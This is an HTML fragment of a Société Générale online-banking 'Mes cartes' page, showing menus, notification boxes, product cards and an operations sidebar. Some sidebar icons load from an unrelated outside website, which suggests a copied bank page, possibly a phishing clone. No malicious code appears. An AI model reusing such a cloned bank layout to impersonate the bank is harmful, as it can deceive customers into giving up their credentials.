<a data-channelid="76263eb2b0d42610VgnVCM100000050013acRCRD" aria-controls="navbe1e7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="paramétrage" data-anchor="null" href="/sbm-mob/mob/sbm-rgl.html" data-tms-click-type="N">                                    Paramétrage
</a>                    </li>
            </ul>
    </li>

        <li class="rsp_nav__item">
        <button class="rsp_btn rsp_btn--toggle js-nav-mobile-first-lvl-btn" aria-expanded="false">Emprunter
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                <path fill="currentColor" fill-rule="evenodd" d="M19.618 7L21 8.331 12 17 3 8.331 4.382 7 12 14.337z"></path>
              </svg>
            </button>
            <ul class="rsp_nav__list js-nav-mobile-second-lvl-container">
                 <!-- LINKS -->
                    <li class="rsp_nav__item rsp_nav__item--connect">
<a data-channelid="dc4563f637cc4610VgnVCM10000057f440c0RCRD" aria-controls="nav156d184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="crédit-à-la-consommation" data-anchor="null" data-cm="1" href="/secure/pret/espace-thematique-pret/credit-consommation-co" data-tms-click-type="N">                                    Crédit à la consommation
</a>                    </li>
                    <li class="rsp_nav__item rsp_nav__item--connect">
<a data-channelid="f2477c7ac9f64610VgnVCM10000057f440c0RCRD" aria-controls="nav9a6d184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="crédit-immobilier" data-anchor="null" data-cm="1" href="/secure/pret/espace-thematique-pret/pret-credit-immobilier" data-tms-click-type="N">                                    Crédit immobilier
</a>                    </li>
            </ul>
    </li>

        <li class="rsp_nav__item">
        <button class="rsp_btn rsp_btn--toggle js-nav-mobile-first-lvl-btn" aria-expanded="false">Épargner
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                <path fill="currentColor" fill-rule="evenodd" d="M19.618 7L21 8.331 12 17 3 8.331 4.382 7 12 14.337z"></path>
              </svg>
            </button>
            <ul class="rsp_nav__list js-nav-mobile-second-lvl-container">
                 <!-- LINKS -->
                    <li class="rsp_nav__item rsp_nav__item--connect">
<a data-channelid="1d65c7dd5f001610VgnVCM100000060012acRCRD" aria-controls="nav5dcd7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="bourse" data-anchor="null" href="/icd/bwd/ident-bwd-index.html#synthese/info-bourse" data-tms-click-type="N">                                    Bourse
</a>                    </li>
                    <li class="rsp_nav__item rsp_nav__item--connect">
<a data-channelid="5fad885f3a7df610VgnVCM10000057f440c0RCRD" aria-controls="nav2abd184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="nos-offres-d'épargne" data-anchor="null" data-cm="1" href="/epargner-placer-son-argent" data-tms-click-type="N">                                    Nos offres d'épargne
</a>                    </li>
            </ul>
    </li>

        <li class="rsp_nav__item">
        <button class="rsp_btn rsp_btn--toggle js-nav-mobile-first-lvl-btn" aria-expanded="false">Assurer
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                <path fill="currentColor" fill-rule="evenodd" d="M19.618 7L21 8.331 12 17 3 8.331 4.382 7 12 14.337z"></path>
              </svg>
            </button>
            <ul class="rsp_nav__list js-nav-mobile-second-lvl-container">
                 <!-- LINKS -->
                    <li class="rsp_nav__item rsp_nav__item--connect">
<a data-channelid="7a9f804f6193f510VgnVCM100000030013acRCRD" aria-controls="navfb1e184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="accueil-assurances" data-anchor="null" href="/icd/assup/assup-restit.html#restit-home/" data-tms-click-type="N">                                    Accueil assurances
</a>                    </li>
                    <li class="rsp_nav__item rsp_nav__item--connect">
<a data-channelid="5d9d885f3a7df610VgnVCM10000057f440c0RCRD" aria-controls="navdb2e184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="nos-offres-d’assurances" data-anchor="null" data-cm="1" href="/assurances" data-tms-click-type="N">                                    Nos offres d’assurances
</a>                    </li>
            </ul>
    </li>

        <li class="rsp_nav__item">
<a data-channelid="0dbb5d7dc69ff610VgnVCM10000057f440c0RCRD" aria-controls="navfc30184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link" data-tms-container-label="navigation-connected" data-tms-element-label="nos-conseils" href="/secure/nos-conseils-espace-client" data-tms-click-type="N">                        Nos conseils
</a>    </li>

        <li class="rsp_nav__item">
        <button class="rsp_btn rsp_btn--toggle js-nav-mobile-first-lvl-btn" aria-expanded="false">Autres
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                <path fill="currentColor" fill-rule="evenodd" d="M19.618 7L21 8.331 12 17 3 8.331 4.382 7 12 14.337z"></path>
              </svg>
            </button>
            <ul class="rsp_nav__list js-nav-mobile-second-lvl-container">
                 <!-- LINKS -->
                    <li class="rsp_nav__item rsp_nav__item--connect">
<a data-channelid="b86f161bb7d63610VgnVCM1000000ae1c6c0RCRD" aria-controls="nav0e4e184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="documents" data-anchor="null" href="/secure/autres/mes-documents" data-tms-click-type="N">                                    Documents
</a>                    </li>
                    <li class="rsp_nav__item rsp_nav__item--connect">
<a data-channelid="c3fa2334a5ec5610VgnVCM10000057f440c0RCRD" aria-controls="navb65e184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="offres-et-avantages" data-anchor="null" data-cm="1" href="/secure/autres/offres-et-avantages/mes-souscriptions-et-avantages" data-tms-click-type="N">                                    Offres et avantages
</a>                    </li>
                    <li class="rsp_nav__item rsp_nav__item--connect">
<a data-channelid="f1bcf2e2b9e63610VgnVCM1000000ae1c6c0RCRD" aria-controls="nav3c5e184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="profil" data-anchor="null" data-cm="1" href="/secure/autres/mon-profil" data-tms-click-type="N">                                    Profil
</a>                    </li>
                    <li class="rsp_nav__item rsp_nav__item--connect">
<a data-channelid="40e36f489963e610VgnVCM10000057f440c0RCRD" aria-controls="nav126e184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="rendez-vous" data-anchor="null" href="/icd/rvd_rva/restitution_rdv/index-authsec.html" data-tms-click-type="N">                                    Rendez-vous
</a>                    </li>
            </ul>
    </li>






<li class="rsp_nav__item rsp_nav__item--emergency">
    <button class="rsp_btn rsp_btn--emergency  js-nav-mobile-first-lvl-btn" aria-expanded="false" aria-controls="sub-list-otherSite">
        Autres sites Société Générale
        <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
          <path fill="currentColor" fill-rule="evenodd" d="M19.618 7L21 8.331 12 17 3 8.331 4.382 7 12 14.337z"></path>
        </svg>
    </button>
    <ul id="sub-list-otherSite" class="rsp_nav__list js-nav-mobile-second-lvl-container">
        <!-- ADD FIRST in is-active -->
            <li class="rsp_nav__item rsp_nav__item--connect">
                <a data-tms-container-label="header-mobile-other-links-sg" class="rsp_nav__link is-active" href="/" data-tms-click-type="N" data-tms-element-label="particuliers">Particuliers</a>
            </li>
            <li class="rsp_nav__item rsp_nav__item--connect">
                <a data-tms-container-label="header-mobile-other-links-sg" class="rsp_nav__link" href="https://privatebanking.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="banque-privée">Banque Privée</a>
            </li>
            <li class="rsp_nav__item rsp_nav__item--connect">
                <a data-tms-container-label="header-mobile-other-links-sg" class="rsp_nav__link" href="https://professionnels.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="professionnels">Professionnels</a>
            </li>
            <li class="rsp_nav__item rsp_nav__item--connect">
                <a data-tms-container-label="header-mobile-other-links-sg" class="rsp_nav__link" href="https://entreprises.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="entreprises">Entreprises</a>
            </li>
            <li class="rsp_nav__item rsp_nav__item--connect">
                <a data-tms-container-label="header-mobile-other-links-sg" class="rsp_nav__link" href="https://associations.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="associations">Associations</a>
            </li>
    </ul>
</li>    <li class="rsp_nav__item rsp_nav__item--emergency">
        <a class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="header-mobile-last-links" href="/aides-contact" data-tms-click-type="N" data-tms-element-label="aide-et-contacts"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#"></use></svg><span>Aide et contacts</span></a>
    </li>
</ul>
			</nav>
		</aside>
	</div>

	<nav class="rsp_nav rsp_nav--sub-level js-container-sublevel" role="navigation" aria-label="navigation secondaire" style=""><ul class="rsp_nav__list js-sub-level">
                 <!-- LINKS -->
            			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="dcfd2ee50183e510VgnVCM100000020012acRCRD">
<a aria-controls="navd04e7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="mes-comptes" data-anchor="null" href="/restitution/cns_listeprestation.html" data-tms-click-type="N">            							Mes comptes
</a>            			</li>
            			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="259bfbd6276e8610VgnVCM10000057f440c0RCRD">
<a aria-controls="nav4b3e7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="mes-cartes" data-anchor="null" href="/com/icd-web/crtes/crtes-caracteristiques-carte.html#caracteristiques/synthese" data-tms-click-type="N">            	<div style="content: &quot;&quot;;position: absolute;width: 61.5167px;height: 2px;bottom: -.5rem;background-color: #e60028;"></div>						Mes cartes
</a>            			</li>
            			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="0efe2ee50183e510VgnVCM100000020012acRCRD">
<a aria-controls="navcc5e7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="virements" data-anchor="null" href="/virement/pas_vipon_saisie.html" data-tms-click-type="N">            							Virements
</a>            			</li>
            			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="9e06d7eb61b7e510VgnVCM100000020012acRCRD">
<a aria-controls="nav075e7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="prélèvements" data-anchor="null" href="/prelevement/prelev_restit_liste_operations.html" data-tms-click-type="N">            							Prélèvements
</a>            			</li>
            			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="1f56d7eb61b7e510VgnVCM100000020012acRCRD">
<a aria-controls="nav1c4e7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="mon-budget" data-anchor="null" href="/gbi-web/rubrique-gbi/gbi-rubrique-tableauDeBord.html" data-tms-click-type="N">            							Mon budget
</a>            			</li>
            </ul></nav>

	<div class="rsp_notif-box js-container-popin">
		<div class="rsp_notif-box__wrapper js-notif-box">
    <h4 class="rsp_notif-box__title js-notif-box-title-container">
        <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="15" height="16" viewBox="0 0 15 16">
            <g fill="none" fill-rule="evenodd">
                <path stroke="#EB2D90" stroke-width="1.5" d="M14 3.8C13.536 12.667 7.5 15 7.5 15S1 12.213 1 3.8l.466-.117C3.616 3.143 5.656 2.235 7.5 1a19.287 19.287 0 0 0 6.034 2.683L14 3.8z"></path>
                <path stroke="#010035" stroke-width="1.5" d="M7.5 4.5v4"></path>
                <path fill="#010035" d="M8.5 10.5a1 1 0 1 1-2 0 1 1 0 1 1 2 0"></path>
            </g>
        </svg>
        <span class="v-align-middle js-notif-box-title">Sécurité</span>
    </h4>
    <span class="rsp_notif-box__description js-notif-box-description"></span>
    <a href="" class="rsp_notif-box__link js-notif-box-link"></a>
    <button class="rsp_btn js-notif-box-close">
        <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16">
        <path fill="currentColor" fill-rule="evenodd" d="M8.707 8l6.718 6.718-.707.707L8 8.707l-6.718 6.718-.707-.707L7.293 8 .575 1.282l.707-.707L8 7.293 14.718.575l.707.707L8.707 8z"></path>
        </svg>
    </button>
</div>
<div class="rsp_notif-box__wrapper">
    <h4 class="rsp_notif-box__title js-notif-box-title-container">
        <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="15" height="16" viewBox="0 0 15 16">
            <g fill="none" fill-rule="evenodd">
                <path stroke="#EB2D90" stroke-width="1.5" d="M14 3.8C13.536 12.667 7.5 15 7.5 15S1 12.213 1 3.8l.466-.117C3.616 3.143 5.656 2.235 7.5 1a19.287 19.287 0 0 0 6.034 2.683L14 3.8z"></path>
                <path stroke="#010035" stroke-width="1.5" d="M7.5 4.5v4"></path>
                <path fill="#010035" d="M8.5 10.5a1 1 0 1 1-2 0 1 1 0 1 1 2 0"></path>
            </g>
        </svg>
        <span class="v-align-middle js-notif-box-title">Sécurité</span>
    </h4>
    <span class="rsp_notif-box__description js-notif-box-description"></span>
    <a href="" class="rsp_notif-box__link js-notif-box-link"></a>
    <button class="rsp_btn js-notif-box-close">
        <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16">
        <path fill="currentColor" fill-rule="evenodd" d="M8.707 8l6.718 6.718-.707.707L8 8.707l-6.718 6.718-.707-.707L7.293 8 .575 1.282l.707-.707L8 7.293 14.718.575l.707.707L8.707 8z"></path>
        </svg>
    </button>
</div><div class="rsp_notif-box__wrapper">
    <h4 class="rsp_notif-box__title js-notif-box-title-container">
        <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="15" height="16" viewBox="0 0 15 16">
            <g fill="none" fill-rule="evenodd">
                <path stroke="#EB2D90" stroke-width="1.5" d="M14 3.8C13.536 12.667 7.5 15 7.5 15S1 12.213 1 3.8l.466-.117C3.616 3.143 5.656 2.235 7.5 1a19.287 19.287 0 0 0 6.034 2.683L14 3.8z"></path>
                <path stroke="#010035" stroke-width="1.5" d="M7.5 4.5v4"></path>
                <path fill="#010035" d="M8.5 10.5a1 1 0 1 1-2 0 1 1 0 1 1 2 0"></path>
            </g>
        </svg>
        <span class="v-align-middle js-notif-box-title">Sécurité</span>
    </h4>
    <span class="rsp_notif-box__description js-notif-box-description"></span>
    <a href="" class="rsp_notif-box__link js-notif-box-link"></a>
    <button class="rsp_btn js-notif-box-close">
        <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16">
        <path fill="currentColor" fill-rule="evenodd" d="M8.707 8l6.718 6.718-.707.707L8 8.707l-6.718 6.718-.707-.707L7.293 8 .575 1.282l.707-.707L8 7.293 14.718.575l.707.707L8.707 8z"></path>
        </svg>
    </button>
</div></div>
	<h1 class="rsp_header__title-page" id="js-mobile-title">Mes cartes</h1>

	<input id="breadcrumb-channel-ids" type="hidden" value="0810a9651a991610VgnVCM100000050012acRCRD,0efe2ee50183e510VgnVCM100000020012acRCRD,5e2a2ee50183e510VgnVCM100000020012acRCRD,d3f92ee50183e510VgnVCM100000020012acRCRD,25d136f55ccb9510VgnVCM100000050013acRCRD">
</header>
<section class="dcw_main" id="dcw_main_section">
<section class="dcw_gb_row dcw_gb_communication">
	        <div class="dcw_visually-hidden">
            <aside class="dcw_alert-message service-message-list" data-id="f04053fc82e41710VgnVCM10000057f440c0RCRD" data-publish-date="NaN" data-start-date="1586070000000" data-end-date="1598886000000">
                <div class="dcw_alert-message_wrapper">
                    <button class="dcw_alert-message_close-btn" href="#" aria-label="Fermer le message">
                        <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#close-2"></use></svg>
                    </button>
                        <svg class="dcw_alert-message_picto-alert" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#alert"></use></svg>
                        <p class="dcw_alert-message_desc">Nous vous informons que les virements effectués après 17h30 sont désormais traités le jour ouvrable suivant. Les virements émis entre 16h et 17h30 sont annulables jusqu’à 17h30.</p>
                </div>
            </aside>
        </div>
</section>
<section class="dcw_gb_wrapper">
<section class="dcw_gb_row dcw_gb_row--small">
</section>
	<main class="dcw_gb2_core-wrapper" role="main">
		<a id="go-content" tabindex="-1"></a>
		<!--
		<section class="dcw_gb_core ugds_serviciel" id="">



        <div id="awt--root-element" class="awt--root-element">
            <div id="sdcWrapper" class="sdcWrapper theme-banque-bddf theme-enseigne-bddf theme-marche-pri enseigne-BDDF marche-PRI theme-media-site-web integrationNGIM sdcContainer"><div id="formMain" class="vupri_wrapper"> <div id="ongletsTypeVirement"><ul class="boutonsVirements"> <li style="float: left; margin-left: 4px;" aria-current="true"><span class="itemVirement itemVirementActif" style="width: 109px;color: #FFF;text-decoration: none;">Virements</span></li> <li style="float: left;"><a class="itemVirement itemVirementBorder" href="/virement/pas_viper_saisie.html" style="width: 121px; color: #423F37; text-decoration: none;">Virements permanents</a></li> <li style="float: left;"><a class="itemVirement itemVirementBorder" href="/virement/pas_vipel_saisie.html" style="width: 99px; color: #423F37; text-decoration: none;">Virements sur PEL</a></li> <li style="float: left;"><a class="itemVirement itemVirementBorder" href="/com/icd-web/vipri/vipri-acquisition.html" style="width: 138px; color: #423F37; text-decoration: none;">Virements internationaux</a></li></ul></div> <div id="messageErreur" aria-live="assertive"></div> <div id="formPopin"></div>
			</div></div>






             <script>var idUsabilla = "b4c508b7aeba";</script>



        </div>


            </section>
			-->

<section class="dcw_gb_row">
	<section class="dcw_section">
        <div class="dcw_card-container">
	        <div class="dcw_grid">
                <h2 class="dcw_title dcw_title--small-border"></h2>
                <div class="js-slider dcw_grid" style="touch-action: pan-y; user-select: none;">
                    <div class="js-slider-pane-wrapper">
                        <div class="js-slider-pane dcw_grid">
                                <div class="dcw_grid-4-12 js-slider-item">
                                        <article class="dcw_o-card dcw_card-prod" style="background-image: url('/static/Particuliers/Medias/Home/Banque/Cartes_bancaires/Pushs-cartes/carte_co_SO_5980_20191119111735.png');">
    <div class="dcw_card-prod_content">
            <div class="dcw_card-prod_desc">Choisissez la carte qui vous plaît</div>
    </div>
    <a aria-label="Voir toutes les cartes collection" class="dcw_card-prod_link" data-tms-container-label="null" href="/ouvrir-compte-bancaire-en-ligne/moyens-paiement/personnaliser-carte-bancaire/cartes-collection" data-tms-click-type="N" data-tms-element-label="voir-les-cartes-collection"></a>
</article>
                                </div>
                                <div class="dcw_grid-4-12 js-slider-item">
                                        <article class="dcw_o-card dcw_card-prod" style="background-image: url('/static/Particuliers/Medias/Home/Banque/Cartes_bancaires/Pushs-cartes/PUSH_PC-011_PCE78_Carte-bancaireHD_20180821152355.png');">
    <div class="dcw_card-prod_content">
            <div class="dcw_card-prod_desc">Société Générale vous propose des services et options à la carte pour personnaliser votre CB.</div>
    </div>
    <a aria-label="Cartes bancaires" class="dcw_card-prod_link" data-tms-container-label="cartes-bancaires" href="/ouvrir-compte-bancaire-en-ligne/moyens-paiement/personnaliser-carte-bancaire" area-label="Personnaliser sa carte" data-tms-click-type="N" data-tms-element-label="personnaliser-sa-carte"></a>
</article>
                                </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
	</section>
</main>
<aside class="dcw_gb2_aside-wrapper">
<section class="dcw_gb2_column-right">

<div class="rightColumnContextualMenuWrapper hide-on-mobile">
        <h3 class="dcw_title dcw_contextual-menu_title">
                Opérations
        </h3>
        <nav>
            <ul class="dcw_contextual-menu_wrapper contextualMenu">
                    <li class="dcw_contextual-menu_item js--hasContext" data-idaction="VUFaireUnVirement" style="display:none;">
                        <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#fonc-transferts-virements-2"></use></svg>
<a data-tms-container-label="contextual-menu-right" class="dcw_contextual-menu_link" href="/virement/pas_vipon_saisie.html" data-tms-click-type="N" data-tms-element-label="faire-un-virement">                        Faire un virement
</a>                    </li>
                    <li class="dcw_contextual-menu_item js--hasContext" data-idaction="VUSuivreMesVirements" style="">
                        <img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/op-suivre-virements.png" class="dummy_side_image">
<a data-tms-container-label="contextual-menu-right" class="dcw_contextual-menu_link" href="/icd/vupri/suivi.html#liste" data-tms-click-type="N" data-tms-element-label="suivre-mes-virements">                        Suivre mes virements
</a>                    </li>
                    <li class="dcw_contextual-menu_item">
                        <img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/op-gerer-virements.png" class="dummy_side_image">
<a data-tms-container-label="contextual-menu-right" class="dcw_contextual-menu_link" href="/virement/sui_viper_liste.html" data-tms-click-type="N" data-tms-element-label="gérer-mes-virements-permanents">                        Gérer mes virements permanents
</a>                    </li>
                    <li class="dcw_contextual-menu_item">
                        <img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/op-gerer-prelevements.png" class="dummy_side_image">
<a data-tms-container-label="contextual-menu-right" class="dcw_contextual-menu_link" href="/prelevement/prelev_restit_liste_operations.html" title="Gérer mes prélèvements" data-tms-click-type="N" data-tms-element-label="gérer-mes-prélèvements">                        Gérer mes prélèvements
</a>                    </li>
                    <li class="dcw_contextual-menu_item">
                        <img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/op-gerer-beneficiaires.png" class="dummy_side_image">
<a data-tms-container-label="contextual-menu-right" class="dcw_contextual-menu_link" href="/personnalisation/per_cptBen_ajouterFrBic.html" data-tms-click-type="N" data-tms-element-label="gérer-les-comptes-bénéficiaires">                        Gérer les comptes bénéficiaires
</a>                    </li>
                    <li class="dcw_contextual-menu_item">
                        <img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/op-notifications.png" class="dummy_side_image">
<a data-tms-container-label="contextual-menu-right" class="dcw_contextual-menu_link" href="/restitution/cns_listeNotification.html" data-tms-click-type="N" data-tms-element-label="notification-de-refus">                        Notification de refus
</a>                    </li>
            </ul>
        </nav>
</div>



























			<div class="dca_emplacement">
				<div id="dad8bed7edeb6dc8c692a1066d6456e4-NGIM_EIPS_desktop_synth_compte_ELYXIR" data-dca-id="dad8bed7edeb6dc8c692a1066d6456e4"></div>



			</div>



<div class="dcw_visually-hidden" data-clientside-answer="conseillee" data-clientside-method-name="getPrestCouranteTypeGestConseillee" data-clientside-id="getPrest">
<div class="eip-spec56_btn_gsm_all_gcd eip-spec56_btn_asv">
    <a data-tms-element-label="Votre Espace Gestion Sous Mandat" data-tms-container-label="contextual-menu-right" data-tms-click-type="N" href="/com/icd-web/rcd/rcd-index.html#rcd/" aria-label="Votre Espace Synoé">
        <img src="/static/Particuliers/pages-specifiques/gsm-alliage-gcd/img/picto-gsm.svg">
        <div class="eip-spec56_titre_btn">Synoé</div>
        <div class="eip-spec56_btn_soustitre">Accéder à mon espace</div>
    </a>
</div>
</div>
<div class="dcw_visually-hidden" data-clientside-answer="gsm" data-clientside-method-name="getPrestCouranteTypeGestSousMandat" data-clientside-id="getPrest">
<div class="eip-spec56_btn_gsm_all_gcd eip-spec56_btn_asv">
    <a data-tms-element-label="Votre Espace Gestion Sous Mandat" data-tms-container-label="bourse-menu-left" data-tms-click-type="N" href="/com/icd-web/tor/tor-gsm-index.html#tor/accueil/" aria-label="Votre Espace Gestion Sous Mandat">
        <img src="/static/Particuliers/pages-specifiques/gsm-alliage-gcd/img/picto-gsm.svg">
        <div class="eip-spec56_titre_btn">Gestion sous mandat</div>
        <div class="eip-spec56_btn_soustitre">Accéder à mon espace</div>
    </a>
</div>

</div>
<div class="dcw_visually-hidden" data-clientside-answer="alliage" data-clientside-method-name="getPrestCouranteTypeGestSousMandat" data-clientside-id="getPrest">
<div class="eip-spec56_btn_gsm_all_gcd eip-spec56_btn_asv">
    <a data-tms-element-label="Votre Espace Alliage Gestion" data-tms-container-label="contextual-menu-right" data-tms-click-type="N" href="/com/icd-web/tor/tor-alliage-index.html#tor/accueil/" aria-label="Votre Espace Alliage gestion">
        <img src="/static/Particuliers/pages-specifiques/gsm-alliage-gcd/img/picto-gsm.svg">
        <div class="eip-spec56_titre_btn">Alliage gestion</div>
        <div class="eip-spec56_btn_soustitre">Accéder à mon espace</div>
    </a>
</div>
</div>
</section>
</aside>
<section class="dcw_gb_row dcw_gb_clearfix">
</section>
	</section>
	</section>
<aside class="dcw_msg-banner dcw_msg-banner--info" role="alert" id="cookieDisclaimer" style="display:none">
    <div class="dcw_msg-banner_msg-wrapper">
        <svg class="dcw_msg-banner_picto-info" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#info"></use></svg>
        <p class="dcw_msg-banner_message">
            En poursuivant votre navigation sur ce site, vous acceptez l'utilisation de cookies pour vous proposer des publicités ciblées adaptées à vos centres d'intérêts et réaliser des statistiques. Pour en savoir plus et paramétrer vos cookies,&nbsp;<span style="font-size: 16px;"><a href="/charte-cookies-societe-generale" class="eip_dcw_main-link">cliquez ici</a></span>.
        </p>
        <button class="dcw_msg-banner_btn-closed" arial-label="Fermer le message contextuel">
            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#close-2"></use></svg>
        </button>
    </div>
</aside><aside class="dcw_msg-banner dcw_msg-banner--info dcw_msg-banner--last-connexion" id="lastConnectionBanner" role="alert" style="display:none;">
<div class="dcw_msg-banner_msg-wrapper"><svg aria-hidden="true" class="dcw_msg-banner_picto-info" focusable="false"> <use width="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#info" height="100%"></use> </svg>
<p class="dcw_msg-banner_message" id="lastConnectionMessage">&nbsp;</p>
<button arial-label="Fermer le message contextuel" class="dcw_msg-banner_btn-closed"><svg aria-hidden="true" focusable="false"> <use width="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#close-2" height="100%"></use> </svg></button></div>
</aside>

<footer class="dcw_footer" role="contentinfo">
	<div class="dcw_footer-second">
		<div class="dcw_footer_container">
			<nav class="dcw_footer-second_nav">
				<ul class="dcw_footer-second_list">
					    <li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="http://agences.societegenerale.fr/banque-assurances/home.asp" data-tms-click-type="N" data-tms-element-label="trouver-une-agence">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#localisation"></use></svg>
            Trouver une agence
</a>    </li>
    <li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="/icd/pch/faq" data-tms-click-type="N" data-tms-element-label="questions-fréquentes">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#question"></use></svg>
            Questions fréquentes
</a>    </li>
<li class="dcw_footer-second_item">
							<div class="dcw_dropdown js-dropdown-light">
    <button class="dcw_dropdown_titre js-dropdown_btn" aria-label="Ouvrir la liste des autres sites Société Générale" aria-expanded="false" aria-owns="dcw-dropdown-list">Autres sites Société Générale</button>
